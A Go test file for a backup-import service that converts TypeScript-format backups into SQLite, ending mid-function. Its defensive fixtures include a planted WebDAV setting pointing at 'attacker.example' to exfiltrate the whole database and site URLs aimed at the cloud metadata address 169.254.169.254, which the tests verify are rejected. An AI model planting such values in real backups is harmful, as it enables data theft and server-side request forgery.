package backup_test

import (
	"database/sql"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	backupsvc "github.com/deliciousbuding/metapi-go/service/backup"
)

// tsV21SampleBackup is a realistic TS (cita-777/metapi) backup JSON v2.1
// payload matching the shape produced by exportBackup in backupService.ts:
// drizzle rows keyed by camelCase property names, settings values as parsed
// JSON, plus a few unknown fields/sections to exercise the warning path.
const tsV21SampleBackup = `{
  "version": "2.1",
  "timestamp": 1755678900000,
  "type": "all",
  "futureTopLevelField": {"hello": "world"},
  "accounts": {
    "sites": [
      {
        "id": 1,
        "name": "站A",
        "url": "https://a.example.com",
        "externalCheckinUrl": null,
        "platform": "new-api",
        "proxyUrl": null,
        "useSystemProxy": false,
        "customHeaders": "{\"X-Token\":\"abc\"}",
        "status": "active",
        "isPinned": true,
        "sortOrder": 0,
        "globalWeight": 1,
        "apiKey": "site-key-a",
        "postRefreshProbeEnabled": false,
        "postRefreshProbeModel": "",
        "postRefreshProbeScope": "single",
        "postRefreshProbeLatencyThresholdMs": 0,
        "createdAt": "2026-08-01 10:00:00",
        "updatedAt": "2026-08-01 10:00:00",
        "futureSiteField": "ignored"
      },
      {
        "id": 2,
        "name": "站B",
        "url": "https://b.example.com",
        "platform": "one-api",
        "proxyUrl": "http://proxy.local:8080",
        "useSystemProxy": true,
        "customHeaders": null,
        "status": "active",
        "isPinned": false,
        "sortOrder": 1,
        "globalWeight": 1.5,
        "apiKey": null,
        "postRefreshProbeEnabled": true,
        "postRefreshProbeModel": "gpt-4o-mini",
        "postRefreshProbeScope": "all",
        "postRefreshProbeLatencyThresholdMs": 800,
        "createdAt": "2026-08-02 10:00:00",
        "updatedAt": "2026-08-02 10:00:00"
      }
    ],
    "siteApiEndpoints": [
      {
        "id": 1,
        "siteId": 1,
        "url": "https://a.example.com/api",
        "enabled": true,
        "sortOrder": 0,
        "cooldownUntil": null,
        "lastSelectedAt": null,
        "lastFailedAt": null,
        "lastFailureReason": null,
        "createdAt": "2026-08-01 10:00:00",
        "updatedAt": "2026-08-01 10:00:00"
      }
    ],
    "siteDisabledModels": [
      {"siteId": 1, "modelName": "gpt-5"}
    ],
    "accounts": [
      {
        "id": 1,
        "siteId": 1,
        "username": "user-a",
        "accessToken": "acc-token-a",
        "apiToken": "api-token-a",
        "balance": 12.5,
        "quota": 20,
        "unitCost": null,
        "valueScore": 0.8,
        "status": "active",
        "isPinned": false,
        "sortOrder": 0,
        "checkinEnabled": true,
        "oauthProvider": null,
        "oauthAccountKey": null,
        "oauthProjectId": null,
        "extraConfig": "{\"plan\":\"pro\"}",
        "createdAt": "2026-08-01 10:00:00",
        "updatedAt": "2026-08-01 10:00:00"
      },
      {
        "id": 2,
        "siteId": 2,
        "username": null,
        "accessToken": "acc-token-b",
        "apiToken": null,
        "balance": 0,
        "quota": 0,
        "unitCost": 0.2,
        "valueScore": 0,
        "status": "disabled",
        "isPinned": true,
        "sortOrder": 1,
        "checkinEnabled": false,
        "oauthProvider": "github",
        "oauthAccountKey": "gh-1",
        "oauthProjectId": "proj-1",
        "extraConfig": null,
        "createdAt": "2026-08-02 10:00:00",
        "updatedAt": "2026-08-02 10:00:00"
      }
    ],
    "accountTokens": [
      {
        "id": 1,
        "accountId": 1,
        "name": "默认令牌",
        "token": "token-1",
        "tokenGroup": null,
        "valueStatus": "ready",
        "source": "manual",
        "enabled": true,
        "isDefault": true,
        "createdAt": "2026-08-01 10:00:00",
        "updatedAt": "2026-08-01 10:00:00"
      }
    ],
    "tokenRoutes": [
      {
        "id": 1,
        "modelPattern": "gpt-*",
        "displayName": "GPT 路由",
        "displayIcon": null,
        "routeMode": "pattern",
        "modelMapping": null,
        "decisionSnapshot": null,
        "decisionRefreshedAt": null,
        "routingStrategy": "weighted",
        "enabled": true,
        "createdAt": "2026-08-01 10:00:00",
        "updatedAt": "2026-08-01 10:00:00"
      }
    ],
    "routeChannels": [
      {
        "id": 1,
        "routeId": 1,
        "accountId": 1,
        "tokenId": 1,
        "oauthRouteUnitId": null,
        "sourceModel": "gpt-4o",
        "priority": 0,
        "weight": 10,
        "enabled": true,
        "manualOverride": false
      }
    ],
    "routeGroupSources": [],
    "manualModels": [
      {"accountId": 1, "modelName": "gpt-4o-mini"}
    ],
    "downstreamApiKeys": [
      {
        "name": "客户端A",
        "key": "sk-downstream-1",
        "description": "外部调用方",
        "groupName": "prod",
        "tags": "[\"vip\"]",
        "enabled": true,
        "expiresAt": null,
        "maxCost": 100,
        "maxRequests": null,
        "supportedModels": "[\"gpt-4o\"]",
        "allowedRouteIds": "[1]",
        "siteWeightMultipliers": "{\"1\":2}",
        "excludedSiteIds": "[]",
        "excludedCredentialRefs": "[]"
      }
    ],
    "futureSection": {"hello": "world"}
  },
  "preferences": {
    "settings": [
      {"key": "theme", "value": "dark"},
      {
        "key": "routing_weights",
        "value": {
          "baseWeightFactor": 1.2,
          "valueScoreFactor": 0.5,
          "costWeight": 1,
          "balanceWeight": 1,
          "usageWeight": 1
        }
      },
      {"key": "auth_token", "value": "should-be-skipped"},
      {"futureSettingField": true}
    ]
  }
}`

func TestIsTSV21Payload(t *testing.T) {
	if !backupsvc.IsTSV21Payload([]byte(tsV21SampleBackup)) {
		t.Fatal("IsTSV21Payload = false for a v2.1 payload, want true")
	}
	if backupsvc.IsTSV21Payload([]byte(`{"tables":{"sites":[]}}`)) {
		t.Fatal("IsTSV21Payload = true for a tables payload, want false")
	}
	if backupsvc.IsTSV21Payload([]byte(`{"version":"1.0","tables":{}}`)) {
		t.Fatal("IsTSV21Payload = true for a v1.0 payload, want false")
	}
	if backupsvc.IsTSV21Payload([]byte(`not json`)) {
		t.Fatal("IsTSV21Payload = true for invalid JSON, want false")
	}
}

func TestParseTSV21NormalizesFieldsAndWarns(t *testing.T) {
	parsed, err := backupsvc.ParseTSV21([]byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("ParseTSV21: %v", err)
	}

	if parsed.Type != "all" {
		t.Fatalf("type = %q, want all", parsed.Type)
	}
	if parsed.SkippedSettings != 2 {
		t.Fatalf("SkippedSettings = %d, want 2 (auth_token + key-less row)", parsed.SkippedSettings)
	}

	// camelCase → snake_case conversion on a sites row.
	siteRows := parsed.Tables["sites"]
	if len(siteRows) != 2 {
		t.Fatalf("sites rows = %d, want 2", len(siteRows))
	}
	secondSite := siteRows[1]
	if secondSite["external_checkin_url"] != nil {
		// field absent in TS row must not be synthesized
		t.Fatalf("site[1] external_checkin_url = %#v, want nil", secondSite["external_checkin_url"])
	}
	if secondSite["proxy_url"] != "http://proxy.local:8080" {
		t.Fatalf("site[1] proxy_url = %#v", secondSite["proxy_url"])
	}
	if secondSite["use_system_proxy"] != true {
		t.Fatalf("site[1] use_system_proxy = %#v, want true", secondSite["use_system_proxy"])
	}
	if secondSite["post_refresh_probe_latency_threshold_ms"] != int64(800) {
		t.Fatalf("site[1] post_refresh_probe_latency_threshold_ms = %#v, want int64(800)", secondSite["post_refresh_probe_latency_threshold_ms"])
	}
	if _, hasUnknown := secondSite["futureSiteField"]; hasUnknown {
		t.Fatal("unknown TS field leaked into the converted row")
	}

	// manualModels → model_availability with synthetic columns.
	manualRows := parsed.Tables["model_availability"]
	if len(manualRows) != 1 {
		t.Fatalf("model_availability rows = %d, want 1", len(manualRows))
	}
	if manualRows[0]["is_manual"] != true || manualRows[0]["available"] != true {
		t.Fatalf("model_availability row = %#v, want is_manual/available true", manualRows[0])
	}
	if manualRows[0]["model_name"] != "gpt-4o-mini" {
		t.Fatalf("model_availability model_name = %#v", manualRows[0]["model_name"])
	}

	// settings values re-marshaled to JSON text; runtime-local and key-less
	// rows dropped.
	settingsRows := parsed.Tables["settings"]
	if len(settingsRows) != 2 {
		t.Fatalf("settings rows = %d, want 2 (auth_token + key-less row skipped)", len(settingsRows))
	}
	byKey := map[string]string{}
	for _, row := range settingsRows {
		byKey[row["key"].(string)] = row["value"].(string)
	}
	if byKey["theme"] != `"dark"` {
		t.Fatalf("settings[theme] = %q, want %q", byKey["theme"], `"dark"`)
	}
	var weights map[string]float64
	if err := json.Unmarshal([]byte(byKey["routing_weights"]), &weights); err != nil {
		t.Fatalf("settings[routing_weights] not valid JSON: %v (%q)", err, byKey["routing_weights"])
	}
	if weights["baseWeightFactor"] != 1.2 {
		t.Fatalf("routing_weights.baseWeightFactor = %v, want 1.2", weights["baseWeightFactor"])
	}

	// Unknown top-level field, unknown section, unknown row field and the
	// key-less settings row must all surface as warnings.
	wantWarnings := []string{
		"ignored unknown top-level field futureTopLevelField",
		"ignored unknown section accounts.futureSection",
		"ignored unknown field sites.futureSiteField",
		"ignored preferences.settings row 4: key missing or empty",
	}
	joined := strings.Join(parsed.Warnings, "\n")
	for _, want := range wantWarnings {
		if !strings.Contains(joined, want) {
			t.Fatalf("warnings %q missing %q", parsed.Warnings, want)
		}
	}
}

func TestImportTSV21ImportsSampleIntoSqlite(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	result, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("ImportTSV21: %v", err)
	}

	wantImported := map[string]int64{
		"sites":                2,
		"site_api_endpoints":   1,
		"site_disabled_models": 1,
		"accounts":             2,
		"account_tokens":       1,
		"token_routes":         1,
		"route_channels":       1,
		"model_availability":   1,
		"downstream_api_keys":  1,
		"settings":             2,
	}
	for table, want := range wantImported {
		if got := result.Imported[table]; got != want {
			t.Fatalf("imported[%s] = %d, want %d (full: %#v)", table, got, want, result.Imported)
		}
	}
	if result.SkippedSettings != 2 {
		t.Fatalf("SkippedSettings = %d, want 2 (auth_token + key-less row)", result.SkippedSettings)
	}

	// sites: snake_case columns populated, booleans stored, unknown field dropped.
	var siteCount int
	if err := db.Get(&siteCount, "SELECT COUNT(*) FROM sites"); err != nil || siteCount != 2 {
		t.Fatalf("sites count = %d err=%v, want 2", siteCount, err)
	}
	var siteB struct {
		ProxyURL     string  `db:"proxy_url"`
		GlobalWeight float64 `db:"global_weight"`
		UseSystem    int     `db:"use_system_proxy"`
		ProbeScope   string  `db:"post_refresh_probe_scope"`
	}
	if err := db.Get(&siteB, "SELECT proxy_url, global_weight, use_system_proxy, post_refresh_probe_scope FROM sites WHERE id = 2"); err != nil {
		t.Fatalf("read site 2: %v", err)
	}
	if siteB.ProxyURL != "http://proxy.local:8080" || siteB.GlobalWeight != 1.5 || siteB.UseSystem != 1 || siteB.ProbeScope != "all" {
		t.Fatalf("site 2 = %+v, want mapped values", siteB)
	}

	// accounts: checkin_enabled boolean stored, extra_config text preserved.
	var accountB struct {
		CheckinEnabled int            `db:"checkin_enabled"`
		OAuthProvider  sql.NullString `db:"oauth_provider"`
		ExtraConfig    sql.NullString `db:"extra_config"`
	}
	if err := db.Get(&accountB, "SELECT checkin_enabled, oauth_provider, extra_config FROM accounts WHERE id = 2"); err != nil {
		t.Fatalf("read account 2: %v", err)
	}
	if accountB.CheckinEnabled != 0 || accountB.OAuthProvider.String != "github" {
		t.Fatalf("account 2 = %+v, want checkin_enabled=0 oauth_provider=github", accountB)
	}
	if accountB.ExtraConfig.Valid {
		t.Fatalf("account 2 extra_config = %q, want NULL", accountB.ExtraConfig.String)
	}
	var accountA struct {
		CheckinEnabled int    `db:"checkin_enabled"`
		ExtraConfig    string `db:"extra_config"`
	}
	if err := db.Get(&accountA, "SELECT checkin_enabled, extra_config FROM accounts WHERE id = 1"); err != nil {
		t.Fatalf("read account 1: %v", err)
	}
	if accountA.CheckinEnabled != 1 || accountA.ExtraConfig != `{"plan":"pro"}` {
		t.Fatalf("account 1 = %+v, want checkin_enabled=1 extra_config preserved", accountA)
	}

	// token routes + route channels.
	var route struct {
		ModelPattern string `db:"model_pattern"`
		Strategy     string `db:"routing_strategy"`
	}
	if err := db.Get(&route, "SELECT model_pattern, routing_strategy FROM token_routes WHERE id = 1"); err != nil {
		t.Fatalf("read token route: %v", err)
	}
	if route.ModelPattern != "gpt-*" || route.Strategy != "weighted" {
		t.Fatalf("token route = %+v", route)
	}
	var channel struct {
		SourceModel string `db:"source_model"`
		Weight      int64  `db:"weight"`
	}
	if err := db.Get(&channel, "SELECT source_model, weight FROM route_channels WHERE id = 1"); err != nil {
		t.Fatalf("read route channel: %v", err)
	}
	if channel.SourceModel != "gpt-4o" || channel.Weight != 10 {
		t.Fatalf("route channel = %+v", channel)
	}

	// site_disabled_models / model_availability / downstream_api_keys.
	var disabled struct {
		ModelName string `db:"model_name"`
	}
	if err := db.Get(&disabled, "SELECT model_name FROM site_disabled_models WHERE site_id = 1"); err != nil {
		t.Fatalf("read site_disabled_models: %v", err)
	}
	if disabled.ModelName != "gpt-5" {
		t.Fatalf("site_disabled_models = %+v", disabled)
	}
	var availability struct {
		IsManual  int    `db:"is_manual"`
		Available int    `db:"available"`
		CheckedAt string `db:"checked_at"`
	}
	if err := db.Get(&availability, "SELECT is_manual, available, checked_at FROM model_availability WHERE account_id = 1"); err != nil {
		t.Fatalf("read model_availability: %v", err)
	}
	if availability.IsManual != 1 || availability.Available != 1 || availability.CheckedAt == "" {
		t.Fatalf("model_availability = %+v, want is_manual=1 available=1 checked_at set", availability)
	}
	var downstream struct {
		GroupName string `db:"group_name"`
		Enabled   int    `db:"enabled"`
		Weights   string `db:"site_weight_multipliers"`
	}
	if err := db.Get(&downstream, "SELECT group_name, enabled, site_weight_multipliers FROM downstream_api_keys WHERE key = ?", "sk-downstream-1"); err != nil {
		t.Fatalf("read downstream_api_keys: %v", err)
	}
	if downstream.GroupName != "prod" || downstream.Enabled != 1 || downstream.Weights != `{"1":2}` {
		t.Fatalf("downstream_api_keys = %+v", downstream)
	}

	// settings: theme stored as JSON text, auth_token skipped.
	var themeValue string
	if err := db.Get(&themeValue, "SELECT value FROM settings WHERE key = ?", "theme"); err != nil {
		t.Fatalf("read settings theme: %v", err)
	}
	if themeValue != `"dark"` {
		t.Fatalf("settings[theme] = %q, want %q", themeValue, `"dark"`)
	}
	var authTokenCount int
	if err := db.Get(&authTokenCount, "SELECT COUNT(*) FROM settings WHERE key = ?", "auth_token"); err != nil {
		t.Fatalf("count auth_token: %v", err)
	}
	if authTokenCount != 0 {
		t.Fatal("runtime-local setting auth_token was imported")
	}

	// Unknown fields/sections must produce warnings without failing.
	if len(result.Warnings) == 0 {
		t.Fatal("expected warnings for unknown fields/sections, got none")
	}
}

func TestImportTSV21SecondImportSkipsDuplicates(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	first, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("first ImportTSV21: %v", err)
	}
	if first.Imported["sites"] != 2 {
		t.Fatalf("first import sites = %d, want 2", first.Imported["sites"])
	}

	second, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("second ImportTSV21: %v", err)
	}
	for table, count := range second.Imported {
		if count != 0 {
			t.Fatalf("second import %s = %d, want 0 (ON CONFLICT DO NOTHING)", table, count)
		}
	}
}

func TestPreviewTSV21PlansInsertAndDuplicates(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	before, err := backupsvc.PreviewTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("PreviewTSV21 before import: %v", err)
	}
	sitesPlan := before.Plan["sites"]
	if sitesPlan.Rows != 2 || sitesPlan.ToInsert != 2 || sitesPlan.Duplicates != 0 {
		t.Fatalf("sites plan before import = %+v, want rows=2 toInsert=2 duplicates=0", sitesPlan)
	}
	settingsPlan := before.Plan["settings"]
	if settingsPlan.Rows != 2 || settingsPlan.ToInsert != 2 || settingsPlan.SkippedRows != 2 {
		t.Fatalf("settings plan before import = %+v, want rows=2 toInsert=2 skippedRows=2", settingsPlan)
	}
	// downstream keys carry no id in v2.1 exports, so they count as inserts.
	keysPlan := before.Plan["downstream_api_keys"]
	if keysPlan.Rows != 1 || keysPlan.ToInsert != 1 {
		t.Fatalf("downstream_api_keys plan = %+v, want rows=1 toInsert=1", keysPlan)
	}
	if len(before.Warnings) == 0 {
		t.Fatal("preview should surface warnings")
	}

	if _, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup)); err != nil {
		t.Fatalf("ImportTSV21: %v", err)
	}

	after, err := backupsvc.PreviewTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("PreviewTSV21 after import: %v", err)
	}
	sitesAfter := after.Plan["sites"]
	if sitesAfter.Rows != 2 || sitesAfter.ToInsert != 0 || sitesAfter.Duplicates != 2 {
		t.Fatalf("sites plan after import = %+v, want rows=2 toInsert=0 duplicates=2", sitesAfter)
	}
	settingsAfter := after.Plan["settings"]
	if settingsAfter.Rows != 2 || settingsAfter.ToInsert != 0 || settingsAfter.Duplicates != 2 {
		t.Fatalf("settings plan after import = %+v, want rows=2 toInsert=0 duplicates=2", settingsAfter)
	}
}

func TestParseTSV21RejectsMalformedPayloads(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		wantSub string
	}{
		{
			name:    "missing timestamp",
			payload: `{"version":"2.1","accounts":{"sites":[]}}`,
			wantSub: "missing timestamp",
		},
		{
			name:    "no recognizable sections",
			payload: `{"version":"2.1","timestamp":1}`,
			wantSub: "no recognizable account or settings data",
		},
		{
			name:    "type accounts without accounts section",
			payload: `{"version":"2.1","timestamp":1,"type":"accounts"}`,
			wantSub: "accounts section structure is incorrect",
		},
		{
			name:    "type preferences without preferences section",
			payload: `{"version":"2.1","timestamp":1,"type":"preferences"}`,
			wantSub: "preferences section structure is incorrect",
		},
		{
			name:    "sites not an array",
			payload: `{"version":"2.1","timestamp":1,"accounts":{"sites":{"a":1}}}`,
			wantSub: "accounts.sites must be an array",
		},
		{
			name:    "missing required field",
			payload: `{"version":"2.1","timestamp":1,"accounts":{"sites":[{"url":"https://a.example.com","platform":"new-api"}]}}`,
			wantSub: "missing required field name",
		},
		{
			name:    "preferences settings not an array",
			payload: `{"version":"2.1","timestamp":1,"preferences":{"settings":{"theme":"dark"}}}`,
			wantSub: "preferences.settings must be an array",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := backupsvc.ParseTSV21([]byte(tc.payload))
			if err == nil {
				t.Fatalf("ParseTSV21 succeeded, want error containing %q", tc.wantSub)
			}
			var clientErr backupsvc.TSV21ClientError
			if !errors.As(err, &clientErr) {
				t.Fatalf("error = %v, want TSV21ClientError", err)
			}
			if !strings.Contains(err.Error(), tc.wantSub) {
				t.Fatalf("error = %q, want containing %q", err.Error(), tc.wantSub)
			}
		})
	}
}

func TestImportTSV21RollsBackOnFailure(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	// Second site row violates accounts FK (site_id 99 does not exist), so the
	// import must fail and roll back everything inserted before the failure.
	payload := `{
	  "version": "2.1",
	  "timestamp": 1755678900000,
	  "accounts": {
	    "sites": [{"id": 1, "name": "站A", "url": "https://a.example.com", "platform": "new-api"}],
	    "accounts": [{"id": 1, "siteId": 99, "accessToken": "acc-token-a"}]
	  }
	}`

	if _, err := backupsvc.ImportTSV21(db, []byte(payload)); err == nil {
		t.Fatal("ImportTSV21 succeeded, want FK failure")
	}

	var siteCount int
	if err := db.Get(&siteCount, "SELECT COUNT(*) FROM sites"); err != nil {
		t.Fatalf("count sites: %v", err)
	}
	if siteCount != 0 {
		t.Fatalf("sites count = %d after rollback, want 0", siteCount)
	}
}

// TestImportTSV21NormalizesExplicitNullStats guards the #933-family residual
// at the import edge: explicit JSON nulls on the nullable numeric/boolean stat
// columns of sites / token_routes / route_channels must import as their DDL
// defaults (0 / 10 / 1 / false / true) instead of NULL, so a TS backup can
// never seed a row that breaks the routing loaders' scans. Truly nullable
// columns (accounts.balance) keep NULL semantics.
func TestImportTSV21NormalizesExplicitNullStats(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	payload := `{
	  "version": "2.1",
	  "timestamp": 1755678900000,
	  "type": "accounts",
	  "accounts": {
	    "sites": [
	      {"id": 1, "name": "站Null", "url": "https://null.example.com", "platform": "new-api",
	       "useSystemProxy": null, "isPinned": null, "sortOrder": null, "globalWeight": null,
	       "postRefreshProbeEnabled": null, "postRefreshProbeLatencyThresholdMs": null}
	    ],
	    "accounts": [
	      {"id": 1, "siteId": 1, "accessToken": "acc-null", "balance": null}
	    ],
	    "tokenRoutes": [
	      {"id": 1, "modelPattern": "gpt-*", "enabled": null}
	    ],
	    "routeChannels": [
	      {"id": 1, "routeId": 1, "accountId": 1, "priority": null, "weight": null,
	       "enabled": null, "manualOverride": null, "successCount": null, "failCount": null,
	       "totalLatencyMs": null, "totalCost": null, "consecutiveFailCount": null, "cooldownLevel": null}
	    ]
	  }
	}`

	if _, err := backupsvc.ImportTSV21(db, []byte(payload)); err != nil {
		t.Fatalf("ImportTSV21 with explicit-null stat columns: %v", err)
	}

	var site struct {
		UseSystemProxy    sql.NullBool    `db:"use_system_proxy"`
		IsPinned          sql.NullBool    `db:"is_pinned"`
		SortOrder         sql.NullInt64   `db:"sort_order"`
		GlobalWeight      sql.NullFloat64 `db:"global_weight"`
		ProbeEnabled      sql.NullBool    `db:"post_refresh_probe_enabled"`
		ProbeLatencyThrMs sql.NullInt64   `db:"post_refresh_probe_latency_threshold_ms"`
	}
	if err := db.Get(&site, `SELECT use_system_proxy, is_pinned, sort_order, global_weight,
		post_refresh_probe_enabled, post_refresh_probe_latency_threshold_ms FROM sites WHERE id = 1`); err != nil {
		t.Fatalf("read imported site: %v", err)
	}
	if !site.UseSystemProxy.Valid || site.UseSystemProxy.Bool != false {
		t.Errorf("use_system_proxy = %+v, want false (DDL default), not NULL", site.UseSystemProxy)
	}
	if !site.IsPinned.Valid || site.IsPinned.Bool != false {
		t.Errorf("is_pinned = %+v, want false (DDL default), not NULL", site.IsPinned)
	}
	if !site.SortOrder.Valid || site.SortOrder.Int64 != 0 {
		t.Errorf("sort_order = %+v, want 0 (DDL default), not NULL", site.SortOrder)
	}
	if !site.GlobalWeight.Valid || site.GlobalWeight.Float64 != 1 {
		t.Errorf("global_weight = %+v, want 1 (DDL default), not NULL", site.GlobalWeight)
	}
	if !site.ProbeEnabled.Valid || site.ProbeEnabled.Bool != false {
		t.Errorf("post_refresh_probe_enabled = %+v, want false (DDL default), not NULL", site.ProbeEnabled)
	}
	if !site.ProbeLatencyThrMs.Valid || site.ProbeLatencyThrMs.Int64 != 0 {
		t.Errorf("post_refresh_probe_latency_threshold_ms = %+v, want 0 (DDL default), not NULL", site.ProbeLatencyThrMs)
	}

	var routeEnabled sql.NullBool
	if err := db.Get(&routeEnabled, "SELECT enabled FROM token_routes WHERE id = 1"); err != nil {
		t.Fatalf("read imported token_route: %v", err)
	}
	if !routeEnabled.Valid || routeEnabled.Bool != true {
		t.Errorf("token_routes.enabled = %+v, want true (DDL default), not NULL", routeEnabled)
	}

	var channel struct {
		Priority             sql.NullInt64   `db:"priority"`
		Weight               sql.NullInt64   `db:"weight"`
		Enabled              sql.NullBool    `db:"enabled"`
		ManualOverride       sql.NullBool    `db:"manual_override"`
		SuccessCount         sql.NullInt64   `db:"success_count"`
		FailCount            sql.NullInt64   `db:"fail_count"`
		TotalLatencyMs       sql.NullInt64   `db:"total_latency_ms"`
		TotalCost            sql.NullFloat64 `db:"total_cost"`
		ConsecutiveFailCount sql.NullInt64   `db:"consecutive_fail_count"`
		CooldownLevel        sql.NullInt64   `db:"cooldown_level"`
	}
	if err := db.Get(&channel, `SELECT priority, weight, enabled, manual_override, success_count,
		fail_count, total_latency_ms, total_cost, consecutive_fail_count, cooldown_level
		FROM route_channels WHERE id = 1`); err != nil {
		t.Fatalf("read imported route_channel: %v", err)
	}
	if !channel.Priority.Valid || channel.Priority.Int64 != 0 {
		t.Errorf("priority = %+v, want 0 (DDL default), not NULL", channel.Priority)
	}
	if !channel.Weight.Valid || channel.Weight.Int64 != 10 {
		t.Errorf("weight = %+v, want 10 (DDL default), not NULL", channel.Weight)
	}
	if !channel.Enabled.Valid || channel.Enabled.Bool != true {
		t.Errorf("enabled = %+v, want true (DDL default), not NULL", channel.Enabled)
	}
	if !channel.ManualOverride.Valid || channel.ManualOverride.Bool != false {
		t.Errorf("manual_override = %+v, want false (DDL default), not NULL", channel.ManualOverride)
	}
	if !channel.SuccessCount.Valid || channel.SuccessCount.Int64 != 0 {
		t.Errorf("success_count = %+v, want 0 (DDL default), not NULL", channel.SuccessCount)
	}
	if !channel.FailCount.Valid || channel.FailCount.Int64 != 0 {
		t.Errorf("fail_count = %+v, want 0 (DDL default), not NULL", channel.FailCount)
	}
	if !channel.TotalLatencyMs.Valid || channel.TotalLatencyMs.Int64 != 0 {
		t.Errorf("total_latency_ms = %+v, want 0 (DDL default), not NULL", channel.TotalLatencyMs)
	}
	if !channel.TotalCost.Valid || channel.TotalCost.Float64 != 0 {
		t.Errorf("total_cost = %+v, want 0 (DDL default), not NULL", channel.TotalCost)
	}
	if !channel.ConsecutiveFailCount.Valid || channel.ConsecutiveFailCount.Int64 != 0 {
		t.Errorf("consecutive_fail_count = %+v, want 0, not NULL", channel.ConsecutiveFailCount)
	}
	if !channel.CooldownLevel.Valid || channel.CooldownLevel.Int64 != 0 {
		t.Errorf("cooldown_level = %+v, want 0, not NULL", channel.CooldownLevel)
	}

	// accounts.balance is truly nullable (unknown balance per #933): explicit
	// null must stay NULL, not be coerced to 0.
	var balance sql.NullFloat64
	if err := db.Get(&balance, "SELECT balance FROM accounts WHERE id = 1"); err != nil {
		t.Fatalf("read imported account: %v", err)
	}
	if balance.Valid {
		t.Errorf("accounts.balance = %v, want NULL preserved", balance.Float64)
	}
}

// maliciousTSV21Backup is a preferences-only payload planted with every
// runtime-local credential/state key. backup_webdav_config_v1 is the P0
// vector: once stored, the backup-webdav scheduler reads it at startup and
// periodically ships the whole database to the attacker endpoint.
const maliciousTSV21Backup = `{
  "version": "2.1",
  "timestamp": 1755678900000,
  "preferences": {
    "settings": [
      {"key": "theme", "value": "dark"},
      {"key": "backup_webdav_config_v1", "value": {"enabled": true, "fileUrl": "https://attacker.example/exfil.json", "username": "a", "password": "b", "exportType": "all", "autoSyncEnabled": true, "autoSyncCron": "0 * * * *"}},
      {"key": "monitor_ldoh_cookie", "value": "ld_auth_session=attacker-session"},
      {"key": "proxy_token", "value": "attacker-proxy-token"},
      {"key": "account_credential_secret", "value": "attacker-master-key"},
      {"key": "auth_token", "value": "attacker-admin-token"},
      {"key": "backup_webdav_state_v1", "value": {"lastSyncAt": "2026-01-01"}}
    ]
  }
}`

func TestImportTSV21BlocksMaliciousRuntimeLocalSettings(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	result, err := backupsvc.ImportTSV21(db, []byte(maliciousTSV21Backup))
	if err != nil {
		t.Fatalf("ImportTSV21: %v", err)
	}
	if result.SkippedSettings != 6 {
		t.Fatalf("SkippedSettings = %d, want 6 (all runtime-local keys)", result.SkippedSettings)
	}
	if result.Imported["settings"] != 1 {
		t.Fatalf("imported[settings] = %d, want 1 (only the benign key)", result.Imported["settings"])
	}

	for _, key := range []string{
		"backup_webdav_config_v1",
		"monitor_ldoh_cookie",
		"proxy_token",
		"account_credential_secret",
		"auth_token",
		"backup_webdav_state_v1",
	} {
		var count int
		if err := db.Get(&count, "SELECT COUNT(*) FROM settings WHERE key = ?", key); err != nil {
			t.Fatalf("count %s: %v", key, err)
		}
		if count != 0 {
			t.Fatalf("runtime-local setting %s was imported", key)
		}
	}

	// Benign keys must keep importing.
	var theme string
	if err := db.Get(&theme, "SELECT value FROM settings WHERE key = ?", "theme"); err != nil {
		t.Fatalf("benign setting was not imported: %v", err)
	}
	if theme != `"dark"` {
		t.Fatalf("settings[theme] = %q, want %q", theme, `"dark"`)
	}
}

func TestImportTSV21ReportsNewDownstreamApiKeys(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	first, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("first ImportTSV21: %v", err)
	}
	// The sample carries one downstream key (name 客户端A / sk-downstream-1);
	// only the name may surface, never the key value.
	if len(first.NewDownstreamApiKeys) != 1 || first.NewDownstreamApiKeys[0] != "客户端A" {
		t.Fatalf("first NewDownstreamApiKeys = %v, want [客户端A]", first.NewDownstreamApiKeys)
	}

	second, err := backupsvc.ImportTSV21(db, []byte(tsV21SampleBackup))
	if err != nil {
		t.Fatalf("second ImportTSV21: %v", err)
	}
	if len(second.NewDownstreamApiKeys) != 0 {
		t.Fatalf("second NewDownstreamApiKeys = %v, want none (duplicate keys are not new)", second.NewDownstreamApiKeys)
	}
}

const tsV21SSRFBackup = `{
  "version": "2.1",
  "timestamp": 1755678900000,
  "type": "all",
  "accounts": {
    "sites": [
      {"id": 1, "name": "Clean", "url": "https://clean.example.com", "platform": "new-api", "status": "active"},
      {"id": 2, "name": "Metadata", "url": "http://169.254.169.254/latest/meta-data/", "platform": "new-api", "status": "active"},
      {"id": 3, "name": "MetadataProxy", "url": "https://proxy.example.com", "proxyUrl": "http://169.254.169.254:8080", "platform": "new-api", "status": "active"}
    ],
    "siteApiEndpoints": [
      {"id": 1, "siteId": 1, "url": "https://ep-clean.example.com", "enabled": true},
      {"id": 2, "siteId": 1, "url": "http://169.254.169.254/ep", "enabled": true}
    ]
  }
}`

func TestImportTSV21DropsForbiddenSiteURLs(t *testing.T) {
	db := setupBackupServiceTestDB(t)

	result, err := backupsvc.ImportTSV21(db, []byte(tsV21SSRFBackup))
	if err != nil {
		t.Fatalf("ImportTSV21: %v", err)
	}
	if got := result.Imported["sites"]; got != 1 {
		t.Fatalf("imported[sites] = %d, want 1 (only the clean site)", got)
	}
	if got := result.Imported["site_api_endpoints"]; got != 1 {
		t.Fatalf("imported[site_api_endpoints] = %d, want 1", got)
	}
	warned := 0
	for _, w := range result.Warnings {
